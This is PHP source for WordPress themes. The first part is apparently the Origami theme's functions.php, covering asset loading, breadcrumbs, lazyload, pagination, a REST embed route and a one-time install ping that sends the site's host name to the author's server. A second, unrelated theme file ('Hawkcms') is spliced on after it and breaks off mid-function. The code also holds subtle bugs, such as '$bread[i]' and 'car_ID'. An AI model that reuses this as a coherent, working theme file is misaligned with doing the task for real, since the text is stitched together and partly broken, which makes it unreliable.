<?php


//检测主题更新
if (is_admin()) {
  require_once get_template_directory() . '/include/theme-update-checker.php';
  $origami_update_checker = new ThemeUpdateChecker(
    'Origami',
    'https://lab.ixk.me/wordpress/Origami-theme-info.json'
  );

  // Update设置
  $origami_version = wp_get_theme()->get('Version');
  if ($origami_version <= 1.0 && !get_option('origami_first_install')) {
    update_option('origami_first_install', true);
  }

  // 用来发送安装信息，只会在安装后调用一次
  if (get_option('origami_first_install') != 'ok') {
    $header = array(
      'http' => array('method' => 'GET')
    );
    $header = stream_context_create($header);
    $key = file_get_contents(
      'http://lab.ixk.me/wordpress/Origami-install-count.php?type=get-key&site-url=' .
        $_SERVER['HTTP_HOST'],
      false,
      $header
    );
    update_option('origami_theme_key', $key);
    update_option('origami_first_install', 'ok');
  }
}

// 加载功能
add_theme_support('title-tag');
add_theme_support('post-thumbnails');
add_filter('pre_option_link_manager_enabled', '__return_true');
register_nav_menus(['main-menu' => esc_html__('主菜单')]);
// 加载主题设置
require get_template_directory() . '/include/customizer.php';

// 配置前端
function origami_frontend_config()
{
  $config = [
    'markdownComment' =>
      get_option('origami_markdown_comment', 'true') == 'true',
    'updateComment' =>
      get_option('origami_enable_comment_update', 'true') == 'true',
    'deleteComment' =>
      get_option('origami_enable_comment_delete', 'true') == 'true',
    'katex' => get_option('origami_katex', 'true') == 'true',
    'mermaid' => get_option('origami_mermaid', 'true') == 'true',
    'animate' => get_option('origami_animate', 'false') == 'true',
    'titleChange' => get_option('origami_title_change', 'true') == 'true',
    'realTimeSearch' =>
      get_option('origami_real_time_search', 'true') == 'true',
    'owo' => get_option('origami_comment_owo', 'true') == 'true',
    'footerTime' => get_option('origami_footer_time', false),
    'liveChat' => get_option('origami_live_chat', false),
    'background' => json_decode(get_option('origami_background', '')),
    'lastInspirationTime' => get_the_time(
      'U',
      get_posts([
        'numberposts' => 1,
        'post_type' => 'inspiration'
      ])[0]
    ),
    'tocLevel' => get_option('origami_toc_level', 'h1,h2,h3'),
    'copyAddCopyright' => get_option('origami_copy_add_copyright', 'ncode')
  ];
  echo "<script>window.origamiConfig = JSON.parse('" .
    json_encode($config) .
    "');</script>";
}
add_action('wp_footer', 'origami_frontend_config', 1);

// 配置
$tem_url = get_template_directory_uri();
$local_assets_url = [
  'spectre_css' => $tem_url . '/css/spectre.min.css',
  'spectre_exp_css' => $tem_url . '/css/spectre-exp.min.css',
  'spectre_icons_css' => $tem_url . '/css/spectre-icons.min.css',
  'origami_js' => $tem_url . '/js/main.js',
  'origami_css' => get_stylesheet_uri(),
  'qrcode_js' => $tem_url . '/js/qrcode.min.js',
  'SMValidator_js' => $tem_url . '/js/SMValidator.min.js',
  'font_awesome_css' => $tem_url . '/css/font-awesome.min.css',
  'canvas_nest_js' => $tem_url . '/js/canvas-nest.js',
  'lazyload_js' => $tem_url . '/js/lazyload.min.js',
  'zooming_js' => $tem_url . '/js/zooming.min.js',
  'owo_css' => $tem_url . '/css/OwO.min.css',
  'owo_js' => $tem_url . '/js/OwO.min.js',
  'tocbot_css' => $tem_url . '/css/tocbot.css',
  'tocbot_js' => $tem_url . '/js/tocbot.min.js',
  'prism_css' => $tem_url . '/css/prism.css',
  'prism_js' => $tem_url . '/js/prism.js',
  'katex_js_1' => $tem_url . '/js/katex.min.js',
  'katex_js_2' => $tem_url . '/js/auto-render.min.js',
  'katex_css' => 'https://cdn.jsdelivr.net/npm/katex@0.10.2/dist/katex.min.css',
  'mermaid_js' => $tem_url . '/js/mermaid.min.js',
  'marked_js' => $tem_url . '/js/marked.min.js'
];

$jsdelivr_assets_url = [
  'spectre_css' =>
    'https://cdn.jsdelivr.net/npm/spectre.css@0.5.8/dist/spectre.min.css',
  'spectre_exp_css' =>
    'https://cdn.jsdelivr.net/npm/spectre.css@0.5.8/dist/spectre-exp.min.css',
  'spectre_icons_css' =>
    'https://cdn.jsdelivr.net/npm/spectre.css@0.5.8/dist/spectre-icons.min.css',
  'origami_js' => '/wp-content/themes/Origami/js/main.js',
  'origami_css' => '/wp-content/themes/Origami/style.css',
  'qrcode_js' => 'https://cdn.jsdelivr.net/npm/qrcode_js@1.0.0/qrcode.min.js',
  'SMValidator_js' =>
    'https://cdn.jsdelivr.net/npm/SMValidator@1.2.7/dist/SMValidator.min.js',
  'font_awesome_css' =>
    'https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css',
  'canvas_nest_js' =>
    'https://cdn.jsdelivr.net/npm/canvas-nest.js@2.0.4/dist/canvas-nest.js',
  'lazyload_js' =>
    'https://cdn.jsdelivr.net/npm/vanilla-lazyload@12.0.0/dist/lazyload.min.js',
  'zooming_js' =>
    'https://cdn.jsdelivr.net/npm/zooming@2.1.1/build/zooming.min.js',
  'owo_css' => 'https://cdn.jsdelivr.net/npm/owo@1.0.2/dist/OwO.min.css',
  'owo_js' => 'https://cdn.jsdelivr.net/npm/owo@1.0.2/dist/OwO.min.js',
  'tocbot_css' => 'https://cdn.jsdelivr.net/npm/tocbot@4.7.1/dist/tocbot.css',
  'tocbot_js' => 'https://cdn.jsdelivr.net/npm/tocbot@4.7.1/dist/tocbot.min.js',
  'prism_css' => '/wp-content/themes/Origami/css/prism.css',
  'prism_js' => '/wp-content/themes/Origami/js/prism.js',
  'katex_js_1' => 'https://cdn.jsdelivr.net/npm/katex@0.11.0/dist/katex.min.js',
  'katex_js_2' =>
    'https://cdn.jsdelivr.net/npm/katex@0.11.0/dist/contrib/auto-render.min.js',
  'katex_css' => 'https://cdn.jsdelivr.net/npm/katex@0.11.0/dist/katex.min.css',
  'mermaid_js' =>
    'https://cdn.jsdelivr.net/npm/mermaid@8.2.3/dist/mermaid.min.js',
  'marked_js' => 'https://cdn.jsdelivr.net/npm/marked@0.7.0/lib/marked.min.js'
];

$assets_url = '';
$assets_str = get_option('origami_assets_url', 'local');
if ($assets_str === 'local') {
  $assets_url = $local_assets_url;
} elseif ($assets_str === 'jsdeliver') {
  $assets_url = $jsdelivr_assets_url;
} else {
  $assets_url = json_decode($assets_str, true);
}

// 加载主要资源
if (!is_admin()) {
  // 加载主要css/js文件
  wp_enqueue_style('spectre_css', $assets_url['spectre_css']);
  wp_enqueue_style('spectre_exp_css', $assets_url['spectre_exp_css']);
  wp_enqueue_style('spectre_icons_css', $assets_url['spectre_icons_css']);
  wp_enqueue_style(
    'origami_css',
    $assets_url['origami_css'],
    [],
    wp_get_theme()->get('Version')
  );
  function css_js_to_footer()
  {
    global $assets_url;
    wp_enqueue_script(
      'origami_js',
      $assets_url['origami_js'],
      [],
      wp_get_theme()->get('Version')
    );
    wp_enqueue_script('qrcode_js', $assets_url['qrcode_js']);
    wp_enqueue_script('SMValidator_js', $assets_url['SMValidator_js']);
    // fa图标
    wp_enqueue_style('font_awesome_css', $assets_url['font_awesome_css']);
    // canvas-nest加载
    if (get_option('origami_canvas_nest', 'true') == 'true') {
      echo '<script type="text/javascript" color="0,0,0" zindex="-1" opacity="0.5" count="99" src="' .
        $assets_url['canvas_nest_js'] .
        '"></script>';
    }
    // Lazyload
    $config = get_option('origami_lazyload');
    if (stripos($config, ',') == true) {
      $config = explode(',', $config);
    } else {
      $config = array('false');
    }
    if (strcmp($config[0], 'true') == 0) {
      wp_enqueue_script('lazyload_js', $assets_url['lazyload_js']);
    }
    // 只有在文章和页面中才会加载
    if (is_single() || is_page()) {
      // Zooming
      wp_enqueue_script('zooming_js', $assets_url['zooming_js']);
      // owo 表情加载
      if (get_option('origami_comment_owo', 'true') == 'true') {
        wp_enqueue_style('owo_css', $assets_url['owo_css']);
        wp_enqueue_script('owo_js', $assets_url['owo_js']);
      }
      // 文章目录加载
      wp_enqueue_style('tocbot_css', $assets_url['tocbot_css']);
      wp_enqueue_script('tocbot_js', $assets_url['tocbot_js']);
      // 加载代码高亮
      wp_enqueue_style('prism_css', $assets_url['prism_css']);
      wp_enqueue_script('prism_js', $assets_url['prism_js']);
      if (get_option('origami_katex', 'true') == 'true') {
        wp_enqueue_script('katex_js_1', $assets_url['katex_js_1']);
        wp_enqueue_script('katex_js_2', $assets_url['katex_js_2']);
        wp_enqueue_style('katex_css', $assets_url['katex_css']);
      }
      if (get_option('origami_mermaid', 'true') == 'true') {
        wp_enqueue_script('mermaid_js', $assets_url['mermaid_js']);
      }
      if (get_option('origami_markdown_comment', 'true') == 'true') {
        wp_enqueue_script('marked_js', $assets_url['marked_js']);
      }
    }
  }
  add_action('wp_footer', 'css_js_to_footer');
  // 加载WorkBox
  if (get_option('origami_workbox', 'true') == 'true') {
    function origami_setting_workbox()
    {
      echo "<script>if ('serviceWorker' in navigator) {
                window.addEventListener('load', () => {
                  navigator.serviceWorker.register('/sw.js');
                });
            }</script>";
    }
    add_action('wp_footer', 'origami_setting_workbox', '101');
  } else {
    function origami_remove_workbox()
    {
      echo "<script>window.addEventListener('load', () => {
                navigator.serviceWorker.getRegistrations().then(function(registrations) {
                for(let registration of registrations) {
                    registration.unregister()
                } });})</script>";
    }
    add_action('wp_footer', 'origami_remove_workbox', '101');
  }
} else {
  function origami_copyright_warn()
  {
    $origami_footer_content = file_get_contents(
      get_theme_file_path() . '/footer.php'
    );
    if (
      stripos($origami_footer_content, 'www.ixk.me') == false ||
      stripos($origami_footer_content, 'origami-theme-info') == false ||
      preg_match(
        "/(<!--)((.*)www\.ixk\.me(.*)|(\n))*?-->/i",
        $origami_footer_content
      ) ||
      preg_match(
        "/(<!--)((.*)origami-theme-info(.*)|(\n))*?-->/i",
        $origami_footer_content
      )
    ) {
      $GLOBALS['theme_edited'] = true;
      function origami_add_warn()
      {
        echo '<div class="notice notice-warning is-dismissible">
                    <p>Warning：你可能修改了页脚的版权信息，请将其修正。Origami主题要求你保留页脚主题信息。</p>
                </div>';
      }
      add_action('admin_notices', 'origami_add_warn');
    }
  }
  add_action('admin_menu', 'origami_copyright_warn');
  // 后台配置面板
  require_once 'include/config.class.php';
  $config_class = new OrigamiConfig();
  wp_enqueue_script(
    'ace_js',
    'https://cdn.jsdelivr.net/npm/ace-builds@1.4.4/src-noconflict/ace.min.js'
  );
  wp_enqueue_script(
    'ace_js_lang_tool',
    'https://cdn.jsdelivr.net/npm/ace-builds@1.4.4/src-noconflict/ext-language_tools.js'
  );
  wp_enqueue_style('prism_css', $assets_url['prism_css']);
  wp_enqueue_script('prism_js', $assets_url['prism_js']);
  wp_enqueue_script('katex_js_1', $assets_url['katex_js_1']);
  wp_enqueue_script('katex_js_2', $assets_url['katex_js_2']);
  wp_enqueue_style(
    'katex_css',
    'https://cdn.jsdelivr.net/npm/katex@0.10.2/dist/katex.min.css'
  );
  wp_enqueue_script('mermaid_js', $assets_url['mermaid_js']);
  // 加载后台编辑器样式
  function origami_mce_css($mce_css)
  {
    if (!empty($mce_css)) {
      $mce_css .= ',';
    }
    $mce_css .= get_template_directory_uri() . '/css/admin-css.css';
    return $mce_css;
  }
  add_filter('mce_css', 'origami_mce_css');
}

// 添加古腾堡资源
function origami_load_blocks()
{
  wp_enqueue_script(
    'origami_block_js',
    get_template_directory_uri() . '/blocks/blocks.build.js',
    ['wp-blocks', 'wp-i18n', 'wp-element', 'wp-editor'],
    true
  );
  wp_enqueue_style(
    'origami_block_css',
    get_template_directory_uri() . '/blocks/blocks.editor.build.css',
    ['wp-edit-blocks']
  );
}
add_action('enqueue_block_editor_assets', 'origami_load_blocks');

// 面包屑导航
function origami_breadcrumbs($echo = true, $class = [])
{
  $breadcrumbs = [];
  if ((!is_home() && !is_front_page()) || is_paged()) {
    global $post;
    $homeLink = home_url();
    $breadcrumbs[] = [
      'name' => __('Home'),
      'link' => $homeLink
    ];
    if (is_category()) {
      $arr = [];
      global $wp_query;
      $cat_obj = $wp_query->get_queried_object();
      $thisCat = $cat_obj->cat_ID;
      $thisCat = get_the_category($thisCat)[0];
      $arr[] = [
        'name' => $thisCat->name,
        'link' => get_category_link($thisCat->cat_ID)
      ];
      $parentCat = get_the_category($thisCat->parent)[0];
      while (
        $parentCat->cat_ID != $thisCat->cat_ID &&
        $parentCat->cat_ID != 0
      ) {
        $arr[] = [
          'name' => $parentCat->name,
          'link' => get_category_link($parentCat->car_ID)
        ];
        $parentCat = get_the_category($parentCat->parent)[0];
      }
      for ($i = count($arr) - 1; $i >= 0; $i--) {
        $breadcrumbs[] = $arr[$i];
      }
    } elseif (is_day()) {
      $breadcrumbs[] = [
        'link' => get_year_link(get_the_time('Y')),
        'name' => get_the_time('Y')
      ];
      $breadcrumbs[] = [
        'link' => get_month_link(get_the_time('Y'), get_the_time('m')),
        'name' => get_the_time('F')
      ];
      $breadcrumbs[] = [
        'name' => get_the_time('d'),
        'link' => false
      ];
    } elseif (is_month()) {
      $breadcrumbs[] = [
        'link' => get_year_link(get_the_time('Y')),
        'name' => get_the_time('Y')
      ];
      $breadcrumbs[] = [
        'link' => false,
        'name' => get_the_time('F')
      ];
    } elseif (is_year()) {
      $breadcrumbs[] = [
        'link' => false,
        'name' => get_the_time('Y')
      ];
    } elseif (is_single() && !is_attachment()) {
      // 文章
      if (get_post_type() != 'post') {
        // 自定义文章类型
        $post_type = get_post_type_object(get_post_type());
        $slug = $post_type->rewrite;
        $breadcrumbs[] = [
          'link' => $homeLink . '/' . $slug['slug'] . '/',
          'name' => $post_type->labels->singular_name
        ];
        $breadcrumbs[] = [
          'link' => false,
          'name' => get_the_title()
        ];
      } else {
        $arr = [];
        $thisCat = get_the_category()[0];
        $arr[] = [
          'name' => $thisCat->name,
          'link' => get_category_link($thisCat->cat_ID)
        ];
        $parentCat = get_the_category($thisCat->parent)[0];
        while (
          $parentCat->cat_ID != $thisCat->cat_ID &&
          $parentCat->cat_ID != 0
        ) {
          $arr[] = [
            'name' => $parentCat->name,
            'link' => get_category_link($parentCat->cat_ID)
          ];
          if ($parentCat->parent == 0) {
            break;
          }
          $parentCat = get_the_category($parentCat->parent)[0];
        }
        for ($i = count($arr) - 1; $i >= 0; $i--) {
          $breadcrumbs[] = $arr[$i];
        }
        $breadcrumbs[] = [
          'link' => false,
          'name' => get_the_title()
        ];
      }
    } elseif (!is_single() && !is_page() && get_post_type() != 'post') {
      $post_type = get_post_type_object(get_post_type());
      $breadcrumbs[] = [
        'link' => false,
        'name' => $post_type->labels->singular_name
      ];
    } elseif (is_attachment()) {
      $parent = get_post($post->post_parent);
      $breadcrumbs[] = [
        'link' => get_permalink($parent),
        'name' => $parent->post_title
      ];
      $breadcrumbs[] = [
        'link' => false,
        'name' => get_the_title()
      ];
    } elseif (is_page() && !$post->post_parent) {
      $breadcrumbs[] = [
        'link' => false,
        'name' => get_the_title()
      ];
    } elseif (is_page() && $post->post_parent) {
      $parent_id = $post->post_parent;
      $bread = [];
      while ($parent_id) {
        $page = get_page($parent_id);
        $bread[] = [
          'link' => get_permalink($page->ID),
          'name' => get_the_title($page->ID)
        ];
        $parent_id = $page->post_parent;
      }
      for ($i = count($bread) - 1; $i >= 0; $i--) {
        $breadcrumbs[] = $bread[i];
      }
      $breadcrumbs[] = [
        'link' => false,
        'name' => get_the_title()
      ];
    } elseif (is_search()) {
      $breadcrumbs[] = [
        'link' => false,
        'name' => sprintf(__('Search Results for: %s'), get_search_query())
      ];
    } elseif (is_tag()) {
      $breadcrumbs[] = [
        'link' => false,
        'name' => sprintf(__('Tag Archives: %s'), single_tag_title('', false))
      ];
    } elseif (is_author()) {
      // 作者存档
      global $author;
      $userdata = get_userdata($author);
      $breadcrumbs[] = [
        'link' => false,
        'name' => sprintf(__('Author Archives: %s'), $userdata->display_name)
      ];
    } elseif (is_404()) {
      $breadcrumbs[] = [
        'link' => false,
        'name' => _e('Not Found')
      ];
    }
    if (get_query_var('paged')) {
      if (
        is_category() ||
        is_day() ||
        is_month() ||
        is_year() ||
        is_search() ||
        is_tag() ||
        is_author()
      ) {
        $breadcrumbs[] = [
          'link' => false,
          'name' => sprintf(__('( Page %s )'), get_query_var('paged'))
        ];
      }
    }
  }
  $str = '';
  if ($echo) {
    foreach ($breadcrumbs as $item) {
      $str .=
        '<li class="breadcrumb-item"><a href="' .
        $item['link'] .
        '">' .
        $item['name'] .
        '</a></li>';
    }
    $class_str = ' ';
    if (is_array($class)) {
      foreach ($class as $class_item) {
        $class_str .= $class_item;
        $class_str .= ' ';
      }
    } elseif (is_string($class)) {
      $class_str .= $class;
    }
    echo '<ul class="breadcrumb' . $class_str . '">' . $str . '</ul>';
  }
}

// 灵感
function origami_inspiration_init()
{
  $labels = [
    'name' => '灵感',
    'singular_name' => '灵感',
    'add_new' => '发表灵感',
    'add_new_item' => '发表灵感',
    'edit_item' => '编辑灵感',
    'new_item' => '新灵感',
    'view_item' => '查看灵感',
    'search_items' => '搜索灵感',
    'not_found' => '暂无灵感',
    'not_found_in_trash' => '没有已遗弃的灵感',
    'parent_item_colon' => '',
    'menu_name' => '灵感'
  ];
  $args = [
    'labels' => $labels,
    'public' => true,
    'publicly_queryable' => true,
    'show_ui' => true,
    'show_in_menu' => true,
    'exclude_from_search' => true,
    'query_var' => true,
    'rewrite' => true,
    'capability_type' => 'post',
    'has_archive' => false,
    'hierarchical' => false,
    'menu_position' => null,
    'show_in_rest' => true,
    'supports' => ['editor', 'author', 'title', 'custom-fields']
  ];
  register_post_type('inspiration', $args);
}
add_action('init', 'origami_inspiration_init');

// 文末版权声明
function origami_content_copyright($content)
{
  if (is_single() || is_feed()) {
    $content .=
      '<div id="content-copyright"><span style="font-weight:bold;text-shadow:0 1px 0 #ddd;font-size: 12px;">声明:</span><span style="font-size: 12px;">本文采用 <a rel="nofollow" href="http://creativecommons.org/licenses/by-nc-sa/3.0/" title="署名-非商业性使用-相同方式共享">BY-NC-SA</a> 协议进行授权，如无注明均为原创，转载请注明转自<a href="' .
      home_url() .
      '">' .
      get_bloginfo('name') .
      '</a><br>本文地址:<a rel="bookmark" title="' .
      get_the_title() .
      '" href="' .
      get_permalink() .
      '">' .
      get_the_title() .
      '</a></span></div>';
  }
  return $content;
}
add_filter('the_content', 'origami_content_copyright');

// 删除后台用来防止出现的问题pre块
function origami_content_change($content)
{
  if (is_single() || is_feed() || is_page()) {
    // 删除pre块
    $matches = [];
    $r = '/<pre class="fix-back-pre">([^<]+)<\/pre>/im';
    if (preg_match_all($r, $content, $matches)) {
      foreach ($matches[1] as $num => $con) {
        $content = str_replace($matches[0][$num], $con, $content);
      }
    }
  }
  return $content;
}
add_filter('the_content', 'origami_content_change');

// 设置文章缩略图
function origami_get_other_thumbnail($post)
{
  // <img.+src=[\'"]([^\'"]+)[\'"].+is-thum=[\'"]([^\'"]+)[\'"].*>
  $image_url = false;
  if (
    preg_match(
      '/\[image.+is-thum="true".+\]([^\'"]+)\[\/image]/i',
      $post->post_content
    ) != 0
  ) {
    preg_match_all(
      '/\[image.+is-thum="true".+\]([^\'"]+)\[\/image]/i',
      $post->post_content,
      $matches
    );
    if (isset($matches[1][0])) {
      $image_url = $matches[1][0];
    }
  }
  if (
    preg_match(
      '/<img.+src=[\'"]([^\'"]+)[\'"].+(data-|)is-thum=[\'"]true[\'"].*>/i',
      $post->post_content
    ) != 0
  ) {
    preg_match_all(
      '/<img.+src=[\'"]([^\'"]+)[\'"].+(data-|)is-thum=[\'"]true[\'"].*>/i',
      $post->post_content,
      $matches
    );
    if (isset($matches[1][0])) {
      $image_url = $matches[1][0];
    }
  }
  return $image_url;
}

// Lazyload图片
function origami_lazyload_img()
{
  $config = get_option('origami_lazyload');
  if (stripos($config, ',') == true) {
    $config = explode(',', $config);
  } else {
    $config = array('false');
  }
  if (strcmp($config[0], 'true') == 0) {
    if (strcmp($config[1], 'post') == 0) {
      add_filter('the_content', 'origami_lazyload_img_process');
    } else {
      add_action('template_redirect', 'lazyload_img_obstart');
      function lazyload_img_all($content)
      {
        return origami_lazyload_img_process($content);
      }
      ob_start('lazyload_img_all');
    }
  }
  function origami_lazyload_img_process_callback($matches)
  {
    $rep_src =
      'src="data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw=="';
    $rep_srcset = $rep_src;
    $img_attr = $matches[1];
    str_replace("'", '"', $img_attr);
    if (preg_match('/(src="([^"]*)?")/i', $img_attr, $src_matches) !== 0) {
      $src_attr = $src_matches[1];
      $src_url = $src_matches[2];
      $data_src = 'data-src="' . $src_url . '"';
      $img_attr = str_replace($src_attr, $data_src . ' ' . $rep_src, $img_attr);
    }
    if (
      preg_match('/(srcset="([^"]*)?")/i', $img_attr, $srcset_matches) !== 0
    ) {
      $srcset_attr = $srcset_matches[1];
      $srcset_url = $srcset_matches[2];
      $data_srcset = 'data-srcset="' . $srcset_url . '"';
      $img_attr = str_replace(
        $srcset_attr,
        $data_srcset . ' ' . $rep_srcset,
        $img_attr
      );
    }
    if (preg_match('/(class="([^"]*)?")/i', $img_attr, $class_matches) !== 0) {
      $class_attr = $class_matches[1];
      $class_val = $class_matches[2];
      $class_out = 'class="lazy ' . $class_val . '"';
      $img_attr = str_replace($class_attr, $class_out, $img_attr);
    } else {
      $img_attr .= ' class="lazy"';
    }
    return '<img ' . $img_attr . ' />';
  }
  function origami_lazyload_bg_process_callback($matches)
  {
    $left_attr = $matches[1];
    $right_attr = $matches[5];
    $bg_url = $matches[4];
    $data_bg = 'data-bg="' . $bg_url . '"';
    if (preg_match('/(class="([^"]*)?")/i', $left_attr, $class_matches) !== 0) {
      $class_attr = $class_matches[1];
      $class_val = $class_matches[2];
      $class_out = 'class="lazy ' . $class_val . '"';
      $left_attr = str_replace($class_attr, $class_out, $left_attr);
    } else {
      if (
        preg_match('/(class="([^"]*)?")/i', $right_attr, $class_matches) !== 0
      ) {
        $class_attr = $class_matches[1];
        $class_val = $class_matches[2];
        $class_out = 'class="lazy ' . $class_val . '"';
        $right_attr = str_replace($class_attr, $class_out, $right_attr);
      } else {
        $right_attr .= ' class="lazy"';
      }
    }
    preg_match('/url\((.*)\)/i', $bg_url, $url_matches);
    return '<' .
      $left_attr .
      $data_bg .
      $right_attr .
      '>' .
      '<img class="lazy lazy-bg-loaded-flag" data-src="' .
      $url_matches[1] .
      '">';
  }
  function origami_lazyload_img_process($content)
  {
    $regex_img = '/<img (.+?)(|\/| )*>/i';
    $regex_bg =
      '/<([^>]*)style=".*((background-image|background)[ :]*(url\(.*\))).*"([^>]*)>/i';
    $content = preg_replace_callback(
      $regex_img,
      'origami_lazyload_img_process_callback',
      $content
    );
    $content = preg_replace_callback(
      $regex_bg,
      'origami_lazyload_bg_process_callback',
      $content
    );
    return $content;
  }
}
add_action('template_redirect', 'origami_lazyload_img');

// 分页导航栏
function origami_pagination($echo = true)
{
  global $wp_query;
  $big = 999999999;
  $pagination_args = [
    'base' => str_replace($big, '%#%', esc_url(get_pagenum_link($big))),
    'format' => '?paged=%#%',
    'total' => $wp_query->max_num_pages,
    'current' => max(1, get_query_var('paged')),
    'show_all' => false,
    'end_size' => 1,
    'prev_next' => true,
    'prev_text' => '<i class="icon icon-back"></i> ' . __('上一页', 'origami'),
    'next_text' =>
      __('下一页', 'origami') . ' <i class="icon icon-forward"></i>',
    'type' => 'array',
    'add_args' => false,
    'add_fragment' => '',
    'before_page_number' => '',
    'after_page_number' => ''
  ];
  $page_arr = paginate_links($pagination_args);
  $paginate = '';
  if ($page_arr) {
    foreach ($page_arr as $value) {
      $paginate .= '<li class="page-item">';
      $paginate .= $value;
      $paginate .= '</li>';
    }
  }
  if ($paginate != '') {
    if ($echo) {
      echo '<ul class="pagination">' . $paginate . '</ul>';
    } else {
      return '<ul class="pagination">' . $paginate . '</ul>';
    }
  }
}

//注册侧边栏
function origami_sidebar_init()
{
  register_sidebar([
    'name' => __('默认侧栏', 'origami'),
    'description' => '默认的侧边栏',
    'id' => 'default_sidebar',
    'before_widget' => '<aside class="sidebar-widget %2$s">',
    'after_widget' => '</aside>',
    'before_title' => '<h3>',
    'after_title' => '</h3>'
  ]);
}
add_action('widgets_init', 'origami_sidebar_init');

// 文章嵌入
function origami_rest_pembed(WP_REST_Request $request)
{
  if (!isset($request['url']) || empty($request['url'])) {
    return [
      'code' => 'no_url',
      'message' => 'Need url parameter',
      'data' => ['status' => 400]
    ];
  }
  $post_id = url_to_postid($request['url']);
  if ($post_id === 0) {
    return [
      'code' => 'no_post_or_page',
      'message' => 'URL does not match the post or page',
      'data' => ['status' => 404]
    ];
  }
  $post = get_post($post_id);
  return [
    'provider_name' => get_bloginfo('name'),
    'provider_url' => get_bloginfo('url'),
    'author_name' => get_the_author_meta('display_name', $post->post_author),
    'title' => $post->post_title,
    'description' => wp_trim_words(
      $post->post_excerpt ? $post->post_excerpt : $post->post_content,
      100
    ),
    'url' => get_permalink($post_id),
    'thumbnail' => wp_get_attachment_url(get_post_thumbnail_id($post_id))
  ];
}
add_action('rest_api_init', function () {
  register_rest_route('origami/v1', '/pembed', [
    'methods' => 'GET',
    'callback' => 'origami_rest_pembed'
  ]);
});

require_once get_template_directory() . '/include/remove.php';
require_once get_template_directory() . '/include/shortcode.php';
require_once get_template_directory() . '/include/aes.class.php';
require_once get_template_directory() . '/include/comment.php';
// end
?>
<?php
$theme_name = 'Hawkcms';

add_action( 'after_setup_theme', 'init_setup_theme' );

//include('theme-option.php');

add_filter( 'pre_option_link_manager_enabled', '__return_true' );

function dopt($e){
    return stripslashes(get_option($e));
}

if ( function_exists('register_sidebar') ) {
	register_sidebar(array(
        'name'          => '首页侧栏',
        'id'            => 'widget_homesidebar',
        'before_widget' => '<li id="%1$s" class="widget %2$s">',
		'after_widget' => '</li>',
		'before_title' => '<h2>',
		'after_title' => '</h2>',
    ));
    register_sidebar(array(
        'name'          => '文章页侧栏',
        'id'            => 'widget_postsidebar',
        'before_widget' => '<li id="%1$s" class="widget %2$s">',
		'after_widget' => '</li>',
		'before_title' => '<h2>',
		'after_title' => '</h2>',
    ));
}
function init_setup_theme(){

    //去除头部冗余代码
    remove_action( 'wp_head',   'feed_links_extra', 3 );
    remove_action( 'wp_head',   'rsd_link' );
    remove_action( 'wp_head',   'wlwmanifest_link' );
    remove_action( 'wp_head',   'index_rel_link' );
    remove_action( 'wp_head',   'start_post_rel_link', 10, 0 );
	remove_action( 'wp_head',   'wp_shortlink_wp_head', 10, 0 );
    //隐藏admin Bar
	function hide_admin_bar($flag) {
		return false;
	}
	add_filter('show_admin_bar','hide_admin_bar');

    //关键字
    add_action('wp_head','set_meta_keywords');

    //页面描述
    add_action('wp_head','set_meta_description');

    //阻止站内PingBack
    if( dopt('d_pingback_b') != '' ){
        add_action('pre_ping','noself_ping');
    }

    //Gzip压缩
    add_action('init','ux_gzip');

    //文章末尾增加版权
    add_filter('the_content','set_copyright');

    //移除自动保存和修订版本
    if( dopt('d_autosave_b') != '' ){
        add_action('wp_print_scripts','ux_disable_autosave' );
        remove_action('pre_post_update','wp_save_post_revision' );
    }

    //去除自带js
    wp_deregister_script( 'l10n' );

    //修改默认发信地址
    add_filter('wp_mail_from', 'res_from_email');
    add_filter('wp_mail_from_name', 'res_from_name');

    //缩略图设置
    add_theme_support('post-thumbnails');
    set_post_thumbnail_size(140, 98, true);

    add_editor_style('editor-style.css');

    //定义菜单
    if (function_exists('register_nav_menus')){
        register_nav_menus( array(
            'nav' => __('导航'),
            'footer' => __('底部链接'),
            'menu' => __('页面菜单')
        ) );
    }

}

// 取消原有jQuery
if ( !is_admin() ) {
    if ( $localhost == 0 ) {
        function my_init_method() {
            wp_deregister_script( 'jquery' );
        }
        add_action('init', 'my_init_method');
    }
}

$dHasShare = false;
function default_avatar_url($mail){
  $p = get_bloginfo('template_directory').'/default.png';
  if($mail=='') return $p;
  preg_match("/src='(.*?)'/i", get_avatar( $mail,'36',$p ), $matches);
  return $matches[1];
}

//评论头像缓存
function set_comment_avatar($avatar) {
  $tmp = strpos($avatar, 'http');
  $g = substr($avatar, $tmp, strpos($avatar, "'", $tmp) - $tmp);
  $tmp = strpos($g, 'avatar/') + 7;
  $f = substr($g, $tmp, strpos($g, "?", $tmp) - $tmp);
  $w = get_bloginfo('wpurl');
  $e = ABSPATH .'avatar/'. $f .'.png';
  $t = dopt('d_avatarDate')*24*60*60;
  if ( !is_file($e) || (time() - filemtime($e)) > $t )
    copy(htmlspecialchars_decode($g), $e);
  else
    $avatar = strtr($avatar, array($g => $w.'/avatar/'.$f.'.png'));
  if ( filesize($e) < 500 )
    copy(get_bloginfo('template_directory').'/img/default.png', $e);
  return $avatar;
}


//关键字
function set_meta_keywords() {
  global $s, $post;
  $keywords = '';
  if ( is_single() ) {
    if ( get_the_tags( $post->ID ) ) {
      foreach ( get_the_tags( $post->ID ) as $tag ) $keywords .= $tag->name . ', ';
    }
    foreach ( get_the_category( $post->ID ) as $category ) $keywords .= $category->cat_name . ', ';
    $keywords = substr_replace( $keywords , '' , -2);
  } elseif ( is_home () )    { $keywords = dopt('d_keywords');
  } elseif ( is_tag() )      { $keywords = single_tag_title('', false);
  } elseif ( is_category() ) { $keywords = single_cat_title('', false);
  } elseif ( is_search() )   { $keywords = esc_html( $s, 1 );
  } else { $keywords = trim( wp_title('', false) );
  }
  if ( $keywords ) {
    echo "<meta name=\"keywords\" content=\"$keywords\">\n";
  }
}

//网站描述
function set_meta_description() {
  global $s, $post;
  $description = '';
  $blog_name = get_bloginfo('name');
  if ( is_singular() ) {
    if( !empty( $post->post_excerpt ) ) {
      $text = $post->post_excerpt;
    } else {
      $text = $post->post_content;
    }
    $description = trim( str_replace( array( "\r\n", "\r", "\n", "　", " "), " ", str_replace( "\"", "'", strip_tags( $text ) ) ) );
    if ( !( $description ) ) $description = $blog_name . "-" . trim( wp_title('', false) );
  } elseif ( is_home () )    { $description = $blog_name . "-" . get_bloginfo('description') . dopt('d_description'); // 首頁要自己加
  } elseif ( is_tag() )      { $description = $blog_name . "'" . single_tag_title('', false) . "'";
